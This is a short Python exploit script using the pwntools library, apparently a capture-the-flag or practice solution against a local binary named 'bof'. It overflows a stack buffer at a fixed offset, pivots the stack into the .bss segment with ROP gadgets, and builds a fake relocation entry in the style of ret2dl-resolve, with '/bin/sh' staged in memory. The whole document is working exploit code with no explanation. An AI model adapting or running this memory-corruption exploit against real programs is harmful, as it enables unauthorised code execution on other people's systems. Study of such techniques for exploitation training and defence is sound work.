#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'M4x'

from pwn import *

elf = ELF("./bof")
offset = 112
readPlt = elf.plt['read']
writePlt = elf.plt['write']

pppr = 0x08048629
pEbpR = 0x0804862b
leaveRet = 0x08048445

io = process("./bof")
payload = 'a' * offset
payload += p32(readPlt)
payload += p32(pppr)
payload += p32(0)
payload += p32(elf.bss() + 0x800)
payload += p32(0x100)
payload += p32(pEbpR)
payload += p32(elf.bss() + 0x800)
payload += p32(leaveRet)

io.sendline(payload)

cmd = "/bin/sh\0"
plt0 = 0x8048370
relPlt = 0x8048324
idxOff = (elf.bss() + 0x800 + 28) - relPlt 
r_info = 0x607
fake_reloc = p32(elf.got['write']) + p32(r_info)

payload = "aaaa"
payload += p32(plt0)
payload += p32(idxOff)
payload += "aaaa"
payload += p32(1)
payload += p32(elf.bss() + 0x800 + 0x80)
payload += p32(len(cmd))
payload += fake_reloc
payload = payload.ljust(0x80, 'a')
payload += cmd
payload = payload.ljust(0x100, 'a')
io.sendline(payload)

io.interactive()
io.close()

